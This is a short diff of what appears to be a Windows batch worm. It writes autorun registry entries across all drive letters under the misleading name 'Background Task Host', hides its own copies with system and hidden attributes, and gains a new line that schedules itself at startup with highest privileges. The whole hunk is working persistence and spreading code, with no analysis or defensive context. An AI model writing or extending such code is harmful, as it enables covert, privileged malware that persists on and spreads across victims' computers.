@@ -94,6 +94,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
       reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
+      schtasks /create /sc onstart /tn %~n0-%%i /tr %%i:\%~nx0 /f /rl highest
       attrib +s +h "%%i:\%~nx0"
 
       if "%%i:" NEQ "%systemDrive%" if "%%i:" NEQ "D:" (
